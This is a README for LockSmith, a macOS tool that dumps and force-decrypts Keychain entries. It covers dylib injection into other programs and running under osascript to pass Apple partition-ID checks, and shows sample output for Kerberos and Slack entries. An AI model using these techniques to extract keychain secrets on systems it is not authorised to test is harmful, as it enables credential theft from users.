# LockSmith

LockSmith is an Objective-C CLI tool for interacting with the macOS file-based Keychains through native APIs. 

Compiling the XCode project will generate both the `LockSmith` MachO file along with a `LockSmithDylib` Dylib that can be used for injection into other programs. The dylib's execution takes place in the constructor located at the bottom of the `main.m` file. Because this sort of execution doesn't really allow passing in of parameters, you need to edit the `exec` function directly with the parameters you want to use for your search before you compile.

`LockSmithLiteJXA` is a smaller JXA-based version of LockSmith so that you can get similar functionality while running under the context of an apple signed binary (osascript). This is helpful if you need to match a partitionID of `apple:` or `apple-tool:`.

## Arguments

- `account` - The account name to search by.
- `label` - The label to search by.
- `keyClass` - The type of entries to search for. Defaults to `genp` (general passwords and secure notes), but also accepts `intp`, `cert`, `keys`, `idnt`, or `all`.
- `debug` - If you want to also print out the current process path and requirements string.
- `force` - If you want to force LockSmith decrypt the matching entries regardless of if LockSmith thinks it can decrypt them or not.
- `validate` - If you want to validate the applications listed in the Trusted Applications lists for matching ACLs.
- `partitionID` - If there's a specific partitionID you want to force decrypt (ex: `teamid:abcd123`). This only applies to entries that match your `account` and `label` searches, you can't just search by `partitionID`.
- `popups` - If you want to allow the program to generate popups or not (Defaults to `false`).

## Examples

```
./LockSmith -label com.apple.kerberos.kdc -keyClass keys -force true
[+] Keychain is unlocked
=================================
      Keychain Entry 0
=================================
Account:       (null)
Label:         com.apple.kerberos.kdc
Service:       (null)
Creation Date: (null)
Modify Date:   (null)
Class:         keys
Key details:
	Signable:   NO
	kcls:       0
	Encrypt:    YES
	Decrypt:    NO
	Wrap Key:   YES
	Unwrap Key: NO
	Verify Key: YES
	Key Type:   42
	Permanent:  YES
	Derive Key: NO
	klbl:       u42qj2Ak/VADT1ijGh+MrotcPDA=
	esiz:       2048
	bsiz:       2048
Owner Authorizations based on ACLAuthorizationPartitionID
Owner Authorizations:
	ACLAuthorizationAny
------------ACLS------------
	--- Entry 0
		Description: (null)
		All applications are trusted
		Authorizations: 
			 ACLAuthorizationAny
	--- Entry 1
		Description: (null)
		All applications are trusted
		Authorizations: 
			 ACLAuthorizationChangeACL
SENSITIVE SECRET BASE64: LS0tLS1CRUd<snip>
=================================
      Keychain Entry 1
=================================
Account:       (null)
Label:         com.apple.kerberos.kdc
Service:       (null)
Creation Date: (null)
Modify Date:   (null)
Class:         keys
Key details:
	Signable:   YES
	kcls:       1
	Encrypt:    NO
	Decrypt:    YES
	Wrap Key:   NO
	Unwrap Key: YES
	Verify Key: NO
	Key Type:   42
	Permanent:  YES
	Derive Key: NO
	klbl:       u42qj2Ak/VADT1ijGh+MrotcPDA=
	esiz:       2048
	bsiz:       2048
OwnerID: 0
GroupID: 0
OwnerType: 0x1
	Owner Authorizations don't match our user context
Owner Authorizations:
	ACLAuthorizationAny
	ACLAuthorizationDecrypt
	ACLAuthorizationDerive
	ACLAuthorizationExportClear
	ACLAuthorizationExportWrapped
	ACLAuthorizationMAC
	ACLAuthorizationSign
------------ACLS------------
	--- Entry 0
		Failed to copy contents with error: -25240
		Failed to copy simple contents with error: -25240
		Authorizations: 
			 ACLAuthorizationAny
	--- Entry 1
		Description: lkdc-acl
		Trusted App: /System/Library/PrivateFrameworks/Heimdal.framework/Helpers/kdc
			Requirement String: identifier "com.apple.kdc" and anchor apple
		Authorizations: 
			 ACLAuthorizationDecrypt
			 ACLAuthorizationDerive
			 ACLAuthorizationExportClear
			 ACLAuthorizationExportWrapped
			 ACLAuthorizationMAC
			 ACLAuthorizationSign
	--- Entry 2
		Failed to copy contents with error: -25240
		Failed to copy simple contents with error: -25240
		Authorizations: 
			 ACLAuthorizationChangeACL
Failed to get password - requires passphrase
```

```
./LockSmith -account Slack                                          
[+] Keychain is unlocked
=================================
      Keychain Entry 0
=================================
Account:       Slack
Label:         Slack Safe Storage
Service:       Slack Safe Storage
Creation Date: 2021-11-12 22:27:45
Modify Date:   2021-11-12 22:27:45
Class:         genp
Owner Authorizations based on ACLAuthorizationPartitionID
Owner Authorizations:
	ACLAuthorizationEncrypt
	ACLAuthorizationDecrypt
	ACLAuthorizationDerive
	ACLAuthorizationExportClear
	ACLAuthorizationExportWrapped
	ACLAuthorizationMAC
	ACLAuthorizationSign
	ACLAuthorizationIntegrity
	ACLAuthorizationPartitionID
------------ACLS------------
	--- Entry 0
		Description: Slack Safe Storage
		All applications are trusted
		Authorizations: 
			 ACLAuthorizationEncrypt
	--- Entry 1
		Description: Slack Safe Storage
		Trusted App: /Applications/Slack.app
			Requirement String: identifier "com.tinyspeck.slackmacgap" and anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = BQR82RBBHL
		Authorizations: 
			 ACLAuthorizationDecrypt
			 ACLAuthorizationDerive
			 ACLAuthorizationExportClear
			 ACLAuthorizationExportWrapped
			 ACLAuthorizationMAC
			 ACLAuthorizationSign
	--- Entry 2
		Description: 9c7d3204702cae4e374379f65059d1d695ada67bb1efd6f69cb34bdb6127ab29
		All applications are trusted
		Authorizations: 
			 ACLAuthorizationIntegrity
	--- Entry 3
		Allowed Code Signatures: teamid:BQR82RBBHL
			TeamID doesn't match current application: nil
		Description: 3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d225554462d38223f3e0a3c21444f435459504520706c697374205055424c494320222d2f2f4170706c652f2f44544420504c49535420312e302f2f454e222022687474703a2f2f7777772e6170706c652e636f6d2f445444732f50726f70657274794c6973742d312e302e647464223e0a3c706c6973742076657273696f6e3d22312e30223e0a3c646963743e0a093c6b65793e506172746974696f6e733c2f6b65793e0a093c61727261793e0a09093c737472696e673e7465616d69643a4251523832524242484c3c2f737472696e673e0a093c2f61727261793e0a3c2f646963743e0a3c2f706c6973743e0a
		All applications are trusted
		Authorizations: 
			 ACLAuthorizationPartitionID
	--- Entry 4
		Description: Slack Safe Storage
		No applications are trusted
		Authorizations: 
			 ACLAuthorizationChangeACL
[-] Cannot get password data without prompting due to: not a trusted application or missing required authorizations
```